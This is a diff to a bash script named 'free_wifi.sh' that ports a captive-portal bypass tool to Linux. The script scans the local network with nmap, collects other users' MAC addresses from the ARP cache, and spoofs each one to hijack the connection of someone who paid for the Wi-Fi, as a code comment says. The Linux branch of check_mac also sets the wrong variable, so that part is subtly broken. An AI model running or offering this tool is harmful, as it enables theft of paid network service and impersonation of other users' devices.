@@ -1,4 +1,4 @@
-#/bin/sh
+#/bin/bash
 #
 # free_wifi.sh
 #
@@ -17,7 +17,7 @@
 #
 # Author:  Arul Selvan
 # Version: Feb 4, 2017
-# OS: macOS
+# OS: macOS, Linux
 # See also: spoof_mac.sh
 #
 
@@ -26,8 +26,10 @@ gdns=8.8.8.8
 my_mac_addr_file="$HOME/.my_mac_address"
 my_mac=""
 iface="en0"
+os_name=`uname -s`
 # calculate the elapsed time (shell automatically increments the var SECONDS magically)
 SECONDS=0
+sleep_sec=30
 
 
 check_root() {
@@ -44,7 +46,12 @@ ping_check() {
 
 restore_mac() {
   echo "[INFO] restoring mac to $my_mac ..."
-  ifconfig $iface ether $my_mac
+
+  if [ $os_name = "Darwin" ]; then
+    ifconfig $iface ether $my_mac
+  else
+    ifconfig $iface hw ether $my_mac
+  fi
 }
 
 save_mac() {
@@ -73,7 +80,12 @@ elapsed_time() {
 
 check_mac() {
   mac_addr=$1
-  ifconfig $iface ether $mac_addr
+  if [ $os_name = "Darwin" ]; then  
+    ifconfig $iface ether $mac_addr
+  else
+    ifconfig $iface hw ether $my_mac    
+  fi
+
   # take the interface down and up to ask for dhcp
   echo "[INFO] taking iface down and up ..."
   ifconfig $iface down
@@ -85,7 +97,8 @@ check_mac() {
   for (( i = 0; i<$count; i++ )) do
     sleep 1
     /bin/echo -n .
-    ip=`ipconfig getifaddr $iface`
+    #ip=`ipconfig getifaddr $iface`
+    ip=`ip addr show $iface | grep 'inet ' | awk '{print $2}' |cut -f1 -d'/'`
     if [ ! -z $ip ] ; then
       break
     fi
@@ -103,6 +116,35 @@ check_mac() {
   return
 }
 
+search_free_wifi() {
+  # do a nmap to collect macaddress in arp cache
+  echo "[INFO] collecting arp cache ..."
+  #my_net=`ipconfig getifaddr $iface|awk -F. '{print $1"."$2"."$3".0/24"; }'`
+  my_net=`ip addr show $iface | grep 'inet ' | awk '{print $2}' |cut -f1 -d'/'|awk -F. '{print $1"."$2"."$3".0/24";}'`
+
+  echo "[INFO] scanning net $my_net"
+  nmap --host-timeout 3 -T5 $my_net >/dev/null 2>&1
+
+  # now get the list of macs and iterate through to find an 
+  # authenticated mac (someone who paid for this crappy wifi)
+  list_of_macs=`arp -an -i $iface|awk '{print $4;}'`
+
+
+  # search through all the macs we collected
+  for mac in $list_of_macs; do 
+    if [ $mac = "(incomplete)" ] ; then
+      continue
+    elif [ $mac = "ff:ff:ff:ff:ff:ff" ] ; then
+      continue
+    elif [ $mac = $my_mac ] ; then
+      continue
+    fi
+    echo "[INFO] checking: $mac ..."
+    check_mac $mac
+  done
+}
+
+#  ------------ main -----------------
 check_root
 
 if [ ! -z $1 ] ; then
@@ -112,28 +154,15 @@ fi
 # save our mac address first
 save_mac
 
-# do a nmap to collect macaddress in arp cache
-echo "[INFO] collecting arp cache ..."
-my_net=`ipconfig getifaddr $iface|awk -F. '{print $1"."$2"."$3".0/24"; }'`
-echo "[INFO] scanning net $my_net"
-nmap --host-timeout 3 -T5 $my_net >/dev/null 2>&1
+# make 3 trys, if we don't get any just exit.
+for ((i=0; i<3; i++)) {
+  echo "[INFO] searching for wifi. Attempt#$i ..."
+  
+  search_free_wifi
 
-# now get the list of macs and iterate through to find an 
-# authenticated mac (someone who paid for this crappy wifi)
-list_of_macs=`arp -an -i $iface|awk '{print $4;}'`
-
-
-for mac in $list_of_macs; do 
-  if [ $mac = "(incomplete)" ] ; then
-    continue
-  elif [ $mac = "ff:ff:ff:ff:ff:ff" ] ; then
-    continue
-  elif [ $mac = $my_mac ] ; then
-    continue
-  fi
-  echo "[INFO] checking: $mac ..."
-  check_mac $mac
-done
+  echo "[INFO] sleeping $sleep_sec ..."
+  sleep 30
+}
 
 # if we get here nothing is available, just restore and exit
 echo "[ERROR] unable to find a working macaddr to use, restoring ..."
